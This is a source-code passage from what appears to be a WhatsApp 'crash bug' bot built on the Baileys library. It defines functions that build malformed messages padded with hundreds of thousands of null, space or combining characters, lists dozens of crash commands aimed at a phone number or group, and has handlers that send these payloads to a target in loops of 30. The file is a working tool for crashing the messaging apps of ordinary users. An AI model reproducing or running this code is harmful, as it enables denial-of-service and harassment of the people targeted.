            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
              'buttons': [{
                'name': "cta_url",
                'buttonParamsJson': "{\"display_text\":\"à¾§\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
              }],
              'messageParamsJson': "\0".repeat(100000)
            })
          })
        }
      }
    }, {});
    afgan.relayMessage(jid, messageContent.message, {
      'messageId': messageContent.key.id
    });
  }
}
async function sendLiveLocationMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'liveLocationMessage': {
          'degreesLatitude': 'p',
          'degreesLongitude': 'p',
          'caption': 'Ø‚Ù†ØƒØ„Ù½Ø‚Ù†ØƒØ„Ù½' + 'ê¦¾'.repeat(50000),
          'sequenceNumber': '0',
          'jpegThumbnail': ''
        }
      }
    }
  }), {
    'userJid': jid
  });
  
  await afgan.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "SÌ¸Yê™°Ì¸Sê™°Ì¸Tê™°Ì¸Eê™°Ì¸Mê™°Ì¸ UÌ¸IÌ¸ CÌ¸Rê™°Ì¸Aê™°Ì¸Sê™°Ì¸Hê™°Ì¸" + "\0".repeat(920000),
      'footerText': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡ÍœâƒŸâ•®",
      'description': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡ÍœâƒŸâ•®",
      'buttonText': null,
      'listType': 2,
      'productListInfo': {
        'productSections': [{
          'title': "lol",
          'products': [{
            'productId': "4392524570816732"
          }]
        }],
        'productListHeaderImage': {
          'productId': "4392524570816732",
          'jpegThumbnail': null
        },
        'businessOwnerJid': "0@s.whatsapp.net"
      }
    },
    'footer': "lol",
    'contextInfo': {
      'expiration': 600000,
      'ephemeralSettingTimestamp': "1679959486",
      'entryPointConversionSource': "global_search_new_chat",
      'entryPointConversionApp': "whatsapp",
      'entryPointConversionDelaySeconds': 9,
      'disappearingMode': {
        'initiator': "INITIATED_BY_ME"
      }
    },
    'selectListType': 2,
    'product_header_info': {
      'product_header_info_id': 292928282928,
      'product_header_is_rejected': false
    }
  }), {
    'userJid': jid
  });
  
  await afgan.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}


async function sendMixedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendLiveLocationMessage(jid);
    sendListMessage(jid);
    await sleep(500);
  }
}

function sendMessageWithMentions(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return afgan.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  } else {
    return afgan.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  }
}

//=================================================//
async function aipong(target) {
await afgan.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}
//=================================================//
async function bakdok(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
    "mimetype": "penis",
    "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
    "fileLength": "999999999",
    "pageCount": 999999999,
    "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
    "fileName": `✳️᜴࿆͆᷍ժׁׅ݊ꫀׁׅܻ݊ᥣׁׅ֪tׁׅɑׁׅ•ᝯׁ֒ꭈׁׅɑׁׅׅ꯱hׁׅ֮╮⭑ ☠️⃰͜͡؜ĐɆⱠ₮₳⃟🔥᜴▴ĐɆⱠ₮₳𝚑ཀ͜͡🔥🔥⃟╮.xp`+"ྦྷ".repeat(60000),
    "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
    "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1715880173"
  }
}), { userJid: target, quoted: kuwoted });
await afgan.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
async function penghitaman(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await afgan.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

//Status
if (!afgan.public) {
if (!m.key.fromMe) return
} 

//=================================================//
async function pirgam(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "🩸⃟༑⌁⃰Đɇⱡ₮₳ ₵Ɽ₳₴Ⱨ Ꮤ𐋅𐌀𐌕𐌔𐌀𐌓𐌓 ᭢ꫀ᭙ཀ͜͡🦠",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/0d557c48dfa376732ac43.jpg" } }, { upload: afgan.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #afganxcrash"
      },
      nativeFlowMessage: {
        messageParamsJson: " ".repeat(1000000)
      }
    }
}), { userJid: target, quoted: kuwoted });
await afgan.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
 async function baklis(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "⟠ afganXCRAS ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々"+" ".repeat(920000),
        'footerText': `✳️᜴࿆͆᷍ĐɆⱠ₮₳•₵Ɽ₳₴Ⱨ̿╮⭑ ☠️⃰͜͡؜ĐɆⱠ₮₳⃟🔥᜴▴ĐɆⱠ₮₳Ӿ99ཀ͜͡😈⃟╮.xp`,
        'description': `✳️᜴࿆͆᷍ĐɆⱠ₮₳•₵Ɽ₳₴Ⱨ╮⭑ ☠️⃰͜͡؜ĐɆⱠ₮₳⃟🔥᜴▴ĐɆⱠ₮₳Ӿ99ཀ͜͡😈⃟╮.xp`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'anjay',
            'products': [
              { "productId": "4392524570816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '4392524570816732',
            'jpegThumbnail': null
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        }
      },
      'footer': 'puki',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
    }), { userJid: target, quoted: ryobug });
await afgan.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
// Fake Resize
const fkethmb = await reSize(ppuser, 300, 300)

// Cuma Fake
const sendOrder = async(jid, text, orid, img, itcount, title, sellers, tokens, ammount) => {
const order = generateWAMessageFromContent(jid, proto.Message.fromObject({
"orderMessage": {
"orderId": orid,
"thumbnail": img,
"itemCount": itcount,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": title,
"message": text,
"sellerJid": sellers,
"token": tokens,
"totalAmount1000": ammount,
"totalCurrencyCode": "IDR",
}
}), { userJid: jid, quoted: m })
afgan.relayMessage(jid, order.message, { messageId: order.key.id})
}

async function loading () {
var gen2 = [
"*𝐍𝐨*",
"*𝐂𝐨𝐮𝐧𝐭𝐞𝐫*",
"*𝐀𝐥𝐰𝐚𝐲𝐬 𝐀𝐟𝐠𝐚𝐧𝐧 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫*"
]
let { key } = await afgan.sendMessage(m.chat, {text: '*𝐀𝐥𝐰𝐚𝐲𝐬 𝐀𝐟𝐠𝐚𝐧𝐧*'})

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

for (let i = 0; i < gen2.length; i++) {
await sleep(1000)
await afgan.sendMessage(m.chat, {text: gen2[i], edit: key });
}
}

//=================================================//
const afganreply = async (teks) => {
await sleep(500)
let thumbnails = [cok, bangke]
let randomIndex = Math.floor(Math.random() * thumbnails.length)
let selectedThumbnail = thumbnails[randomIndex]
return afgan.sendMessage(m.chat, {
contextInfo: {
mentionedJid: [m.sender],
externalAdReply: {
showAdAttribution: false,
renderLargerThumbnail: false,
title: `ↈAғɢᴀɴɴ.ʏᴀɴᴅᴇx.ᴄᴏᴍᬊᬁ`,
body: `👤 名前 : ${m.pushName}`,
previewType: "VIDEO",
thumbnail: selectedThumbnail,
sourceUrl: `https://www.instagram.com/https://www.instagram.com/afgann_hensemm`,
mediaUrl: `https://www.instagram.com/afgann_hensemm`
}
},
text: teks
}, {
quoted: m
})
await sleep(500)
}
//=================================================//

const reply = (teks) => { 
afgan.sendMessage(from, { text: teks, contextInfo: { 
"externalAdReply": { 
"showAdAttribution": true, 
"title": `ↈAғɢᴀɴɴ.ʏᴀɴᴅᴇx.ᴄᴏᴍᬊᬁ`, 
"body": `👤 名前 : ${m.pushName}`,
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": cok, 
"mediaUrl": "https://www.instagram.com/https://www.instagram.com/afgann_hensemm", 
"sourceUrl": "https://www.instagram.com/https://www.instagram.com/afgann_hensemm" }}}, { quoted: m }) }


const lep = { 
key: {
fromMe: [], 
participant: "0@s.whatsapp.net", ...(from ? { remoteJid: "" } : {}) 
},
'message': {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 40,
"width": 40,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "99999999",
"mediaKeyTimestamp": "16572901099967",
'isAnimated': []
}}}

const hw = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) 
},
"message": {
"audioMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172&mms3=true",
"mimetype": "audio/mp4",
"fileSha256": "oZeGy+La3ZfKAnQ1epm3rbm1IXH8UQy7NrKUK3aQfyo=",
"fileLength": "1067401",
"seconds": 60,
"ptt": true,
"mediaKey": "PeyVe3/+2nyDoHIsAfeWPGJlgRt34z1uLcV3Mh7Bmfg=",
"fileEncSha256": "TLOKOAvB22qIfTNXnTdcmZppZiNY9pcw+BZtExSBkIE=",
"directPath": "/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172",
"mediaKeyTimestamp": "1684161893"
}}}

const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://telegra.ph/file/0d557c48dfa376732ac43.jpg' }}}}
function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}
    
if (m.isGroup && !m.key.fromMe && !isOwner && antilink) {
if (!isBotAdmins) return
if (budy.match(`whatsapp.com`)) {
afgan.sendMessage(m.chat, {text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`}, {quoted:m})
afgan.groupParticipantsUpdate(m.chat, [sender], 'delete')
afgan.sendMessage(m.chat, { delete: m.key })
}
}

switch (command) {

case 'menu': {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
await loading()
let anjg = [bangke, cok]
let randomIndex = Math.floor(Math.random() * anjg.length)
let mydick = anjg[randomIndex]
//text menu
let njing = `
» *BOT PRIVATE 𝖵3*

꫞ *Hi*  ${sender.split("@")[0]}

╭•┈┈⛧┈♛ *I͜͡N͜͡F͜͡O͜͡ U͜͡S͜͡R͜͡* ♛┈⛧┈┈•༶
│ღ   Name  : ${pushname}
│ღ   Status : ${isPremium ? "Premium" : "Free"}
└──ᘏツ

╭─×͜× 〣 *BUG EMOJI* 〢
│ღ   ${prefix}☠️ 62xxx
│ღ   ${prefix}😂 62xxx
│ღ   ${prefix}🥵 62xxx
│ღ   ${prefix}💦 62xxx
│ღ   ${prefix}🥶 62xxx
│ღ   ${prefix}😳 62xxx
│ღ   ${prefix}🩸 62xxx
│ღ   ${prefix}😈 62xxx
│ღ   ${prefix}🔥 62xxx
│ღ   ${prefix}🌷 62xxx
│ღ   ${prefix}💥 62xxx
│ღ   ${prefix}🌹 62xxx
│ღ   ${prefix}⭐ 62xxx
│ღ   ${prefix}⚡ 62xxx
│ღ   ${prefix}💀 62xxx
│ღ   ${prefix}🗿 62xxx
╰×͜×

╭─×͜× 〣 *BUG NUMBER* 〢
│ღ   ${prefix}sipilist 62xxx
│ღ   ${prefix}1hit 62xxx
│ღ   ${prefix}1shoot 62xxx
│ღ   ${prefix}brutal 62xxx
│ღ   ${prefix}apalah 62xxx
│ღ   ${prefix}onekill 62xxx
│ღ   ${prefix}doublekill 62xxx
│ღ   ${prefix}triplekill 62xxx
│ღ   ${prefix}unlimited-bug 62xxx
│ღ   ${prefix}bug-quoted 62xxx
│ღ   ${prefix}phone-crash 62xxx
│ღ   ${prefix}afgan-virus 62xxx
│ღ   ${prefix}crash-total 62xxx
│ღ   ${prefix}devilbug 62xxx
│ღ   ${prefix}nolimit 62xxx
│ღ   ${prefix}chace-bug 62xxx
│ღ   ${prefix}mantap-cok 62xxx
│ღ   ${prefix}blank-ui 62xxx
│ღ   ${prefix}mampuslu 62xxx
│ღ   ${prefix}goyang 62xxx
│ღ   ${prefix}kekuatanhitam 62xxx
│ღ   ${prefix}cringe 62xxx
│ღ   ${prefix}stardust 62xxx
│ღ   ${prefix}afgan1 62xxx
│ღ   ${prefix}afgan2 62xxx
│ღ   ${prefix}afgan3 62xxx
│ღ   ${prefix}afganx 62xxx
│ღ   ${prefix}afganx2 62xxx
│ღ   ${prefix}afganx3 62xxx
│ღ   ${prefix}afganx4 62xxx
│ღ   ${prefix}afganx5 62xxx
│ღ   ${prefix}internal-quoted 62xxx
│ღ   ${prefix}external-quoted 62xxx
│ღ   ${prefix}notif-ui 62xxx
│ღ   ${prefix}notif-crash 62xxx
│ღ   ${prefix}virg4m 62xxx
│ღ   ${prefix}bijibapakkau 62xxx
│ღ   ${prefix}reset-ui 62xxx
│ღ   ${prefix}bug-rom 62xxx
│ღ   ${prefix}fatal-notif 62xxx
│ღ   ${prefix}fatal-ui 62xxx
│ღ   ${prefix}crash-total 62xxx
│ღ   ${prefix}bug-s 62xxx
│ღ   ${prefix}zero-bug 62xxx
│ღ   ${prefix}forces-sql 62xxx
│ღ   ${prefix}gaskenafgan 62xxx
│ღ   ${prefix}afgantop 62xxx
│ღ   ${prefix}afgansepele 62xxx
│ღ   ${prefix}afgananjay 62xxx
│ღ   ${prefix}kerupuk 62xxx
│ღ   ${prefix}kelapir 62xxx
│ღ   ${prefix}anjir 62xxx
│ღ   ${prefix}sendgas 62xxx
│ღ   ${prefix}crashtotal 62xxx
╰×͜×

╭─×͜× 〣 *BUG VIRTEX* 〢
│ღ   ${prefix}virtex1 62xxx
│ღ   ${prefix}virtex2 62xxx
│ღ   ${prefix}virtex3 62xxx
│ღ   ${prefix}slayer07 62xxx
│ღ   ${prefix}darkness 62xxx
╰×͜×

╭─×͜× 〣 *BUG LOKASI* 〢
│ღ   ${prefix}lokas1 62xxx
│ღ   ${prefix}lokas2 62xxx
│ღ   ${prefix}lokas3 62xxx
╰×͜×

╭─×͜× 〣 *BUG DOCUMENT* 〢
│ღ   ${prefix}doku1 62xxx
│ღ   ${prefix}doku2 62xxx
│ღ   ${prefix}doku3 62xxx
╰×͜×

╭─×͜× 〣 *BUG AUDIO* 〢
│ღ   ${prefix}audio1 62xxx
│ღ   ${prefix}audio2 62xxx
│ღ   ${prefix}audio3 62xxx
╰×͜×

╭─×͜× 〣 *BUG GAMBAR* 〢
│ღ   ${prefix}gambar1 62xxx
│ღ   ${prefix}gambar2 62xxx
│ღ   ${prefix}gambar3 62xxx
╰×͜×

╭─×͜× 〣 *BUG KONTAK* 〢
│ღ   ${prefix}kontak1 62xxx
│ღ   ${prefix}kontak2 62xxx
│ღ   ${prefix}kontak3 62xxx
╰×͜×

╭─×͜× 〣 *BUG VIDEO* 〢
│ღ   ${prefix}video1 62xxx
│ღ   ${prefix}video2 62xxx
│ღ   ${prefix}video3 62xxx
╰×͜×

╭─×͜× 〣 *BUG EPEP* 〢
│ღ   ${prefix}sg2alok 62xxx
│ღ   ${prefix}bugepep 62xxx
│ღ   ${prefix}onetepkanguru 62xxx
│ღ   ${prefix}isianbg 62xxx
╰×͜×

╭─×͜× 〣 *BUG PHILIPS* 〢
│ღ   ${prefix}philips1 62xxx
│ღ   ${prefix}philips2 62xxx
│ღ   ${prefix}philips2 62xxx
╰×͜×

╭─×͜× 〣 *BUG PANASONIC* 〢
│ღ   ${prefix}panasonic1 62xxx
│ღ   ${prefix}panasonic2 62xxx
│ღ   ${prefix}panasonic3 62xxx
╰×͜×

╭─×͜× 〣 *BUG POLYTRON* 〢
│ღ   ${prefix}polytron1 62xxx
│ღ   ${prefix}polytron2 62xxx
│ღ   ${prefix}polytron3 62xxx
╰×͜×

╭─×͜× 〣 *BUG WANGSAF* 〢
│ღ   ${prefix}bugori 62xxx
│ღ   ${prefix}bugbisnis 62xxx
│ღ   ${prefix}bugmods 62xxx
╰×͜×

╭─×͜× 〣 *BUG SANTET* 〢
│ღ   ${prefix}santet 62xxx
│ღ   ${prefix}santetfullday 62xxx
│ღ   ${prefix}santet1jam 62xxx
│ღ   ${prefix}santetcrash 62xxx
╰×͜×

╭─×͜× 〣 *BUG CRASH* 〢
│ღ   ${prefix}androcrash 62xxx
│ღ   ${prefix}ipcrash 62xxx
│ღ   ${prefix}pccrash 62xxx
╰×͜×

╭─×͜× 〣 *BUG KUDETA* 〢
│ღ   ${prefix}kudetathp1 *REPLY IMAGE*
│ღ   ${prefix}kudetathp2
╰×͜×

╭─×͜× 〣 *BUG PRIBADI* 〢
│ღ   ${prefix}bugvid1
│ღ   ${prefix}bugvid2
│ღ   ${prefix}=.
╰×͜×

╭─×͜× 〣 *BUG JUMLAH V1* 〢
│ღ   ${prefix}lembu 62xxx|5
│ღ   ${prefix}afganslebew 62xxx|5
│ღ   ${prefix}afganelitceesnew 62xxx|5
│ღ   ${prefix}afgangas 62xxx|5
│ღ   ${prefix}gasbugafgan 62xxx|5
│ღ   ${prefix}oemji 62xxx|5
│ღ   ${prefix}lawack 62xxx|5
│ღ   ${prefix}devil-list 62xxx|5
│ღ   ${prefix}bug-list 62xxx|5
│ღ   ${prefix}buglist-external 62xxx|5
│ღ   ${prefix}buglist-internal 62xxx|5
│ღ   ${prefix}buglist-engine 62xxx|5
│ღ   ${prefix}buglist-crash 62xxx|5
│ღ   ${prefix}virus-id 62xxx|5
╰×͜×

╭─×͜× 〣 *BUG JUMLAH V2* 〢
│ღ   ${prefix}blank 62xxx,5
│ღ   ${prefix}blank-dark 62xxx,5
│ღ   ${prefix}jomok 62xxx,5
│ღ   ${prefix}jomok-blank 62xxx,5
│ღ   ${prefix}anything-crash 62xxx,5
│ღ   ${prefix}blank-ui 62xxx,5
│ღ   ${prefix}spesial-bug 62xxx,5
│ღ   ${prefix}eror-bug 62xxx,5
│ღ   ${prefix}maaf-ya 62xxx,5
│ღ   ${prefix}jids-toui 62xxx,5
│ღ   ${prefix}jids-engine 62xxx,5
│ღ   ${prefix}jids-internal 62xxx,5
│ღ   ${prefix}jids-external 62xxx,5
│ღ   ${prefix}jids-system 62xxx,5
│ღ   ${prefix}jids-lol 62xxx,5
│ღ   ${prefix}jids-unexpected 62xxx,5
│ღ   ${prefix}afgan-novo 62xxx,5
│ღ   ${prefix}reset-ui 62xxx,5
│ღ   ${prefix}afgan-crash1 62xxx,5
│ღ   ${prefix}internal-crash 62xxx,5
│ღ   ${prefix}internal-ui 62xxx,5
│ღ   ${prefix}crash-myinter 62xxx,5
│ღ   ${prefix}devil-internal 62xxx,5
│ღ   ${prefix}devil-external 62xxx,5
│ღ   ${prefix}engine-crash 62xxx,5
│ღ   ${prefix}engine-internal 62xxx,5
│ღ   ${prefix}engine-external 62xxx,5
│ღ   ${prefix}engine-ui 62xxx,5
│ღ   ${prefix}bug-engine 62xxx,5
│ღ   ${prefix}systemuicrash 62xxx,5
╰×͜×

╭─×͜× 〣 *BUG VIP* 〢
│ღ   ${prefix}bug-vip 62xxx
│ღ   ${prefix}brutal 62xxx
│ღ   ${prefix}1hit 62xxx
│ღ   ${prefix}1shoot 62xxx
╰×͜×

╭─×͜× 〣 *BUG SAMSUNG* 〢
│ღ   ${prefix}samsung-bug 62xxx
│ღ   ${prefix}samsung-ui 62xxx
│ღ   ${prefix}samsung-internal 62xxx
│ღ   ${prefix}samsung-external 62xxx
│ღ   ${prefix}samsung-reboot 62xxx
│ღ   ${prefix}samsung-crash 62xxx
│ღ   ${prefix}samsung-cache 62xxx
│ღ   ${prefix}samsung-24j 62xxx
╰×͜×

╭─×͜× 〣 *BUG IOS* 〢
│ღ   ${prefix}vios-unli 62xxx
│ღ   ${prefix}bug-ipong 62xxx
│ღ   ${prefix}bug-ios 62xxx
│ღ   ${prefix}ios-24j 62xxx
│ღ   ${prefix}ios-ui 62xxx
│ღ   ${prefix}ios-unlimitedj 62xxx
│ღ   ${prefix}ios-infinity 62xxx|timer
│ღ   ${prefix}ios-uicrash 62xxx|timer
╰×͜×

╭─×͜× 〣 *BUG GROUP* 〢
│ღ   ${prefix}buttongc <link group>
│ღ   ${prefix}gcampas <link group>
│ღ   ${prefix}gcspam <link group>
│ღ   ${prefix}crashgc <link group>
│ღ   ${prefix}afganelitceesgc <link group>
│ღ   ${prefix}crashasu <link group>
│ღ   ${prefix}bug-button <link group>
│ღ   ${prefix}crash-berjamaah <link group>
│ღ   ${prefix}button-internal <link group>
│ღ   ${prefix}button-external <link group>
│ღ   ${prefix}ui-grup <link group>
│ღ   ${prefix}bug-loc <link group>
│ღ   ${prefix}bug-browser <link group>
│ღ   ${prefix}bug-gc <120###@g.us>
│ღ   ${prefix}penghitaman <120###@g.us>
│ღ   ${prefix}bug-hole <120###@g.us>
│ღ   ${prefix}enemygroup <120###@g.us>
│ღ   ${prefix}internal-group <120###@g.us>
│ღ   ${prefix}external-group <120###@g.us>
┃⭓ #cek id = ketik *.cekidgc*
╰×͜×

╭─×͜× 〣 *OWNER MENU* 〢
│ღ   ${prefix}self
│ღ   ${prefix}public
│ღ   ${prefix}addowner 62xxx
│ღ   ${prefix}delowner 62xxx
│ღ   ${prefix}addprem 62xxx
│ღ   ${prefix}delprem 62xxx
│ღ   ${prefix}vidhd <reply video>
╰×͜×

╭─×͜× 〣 *OTHER MENU* 〢
│ღ   ${prefix}tiktok <link>
│ღ   ${prefix}hdvid <reply video>
│ღ   ${prefix}ttmp3 <link>
│ღ   ${prefix}check-host <url>
│ღ   ${prefix}temp-ban 62xxx
│ღ   ${prefix}cekprovider 62xxx
╰×͜×
*_ↈAғɢᴀɴɴ.ʏᴀɴᴅᴇx.ᴄᴏᴍᬊᬁ_*
`
let kontollurus = {
image: bangke,
caption: njing,
contextInfo:{externalAdReply:{
title: 'ↈAғɢᴀɴɴ.ʏᴀɴᴅᴇx.ᴄᴏᴍᬊᬁ',
body: `👤 名前 : ${m.pushName}`, 
showAdAttribution: true,
thumbnail: mydick,
mediaType: 4,
MediaUrl:`https://instagram.com/afgann_hensemm`,
sourceUrl:`https://instagram.com/afgann_hensemm`,
}}
};

afgan.sendMessage(m.chat, kontollurus, { quoted: m })
}
break
case 'jomok-blank': { 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> crash sudah terkirim... `)
for (let j = 0; j < 30; j++) {
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'mampuslu': { 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> crash sudah terkirim... `)
for (let j = 0; j < 30; j++) {
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case "afgan":{
//if (!isRegistered) return registerbut(noregis)
if (!isPremium) return reply(mess.only.premium)
if (!isOwner) return reply(mess.only.owner)
let ntahlahh9 = `./lib/IMLEK.mp3`
let getGroups = await afgan.groupFetchAllParticipating()
let groupss = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let data = groupss.map((v) => v.id)

let teks22 = `*_</> hi afgan telah online_`
const buf = await getBuffer(`https://img.moehu.org/pic.php?id=mrfz`)
for (let x of data) {
await afgan.sendMessage(x, {audio: fs.readFileSync(ntahlahh9), mimetype:'audio/mpeg', ptt: true }, m)
await afgan.sendMessage(x, { contextInfo: { forwardingScore: 10, isForwarded: false }, image: buf, caption: teks22 })
await sleep(100)
}
reply(`Success send broadcast message to ${data.length} groups chats`)
}
break
case 'hdvid' :
case 'hdvideo': 
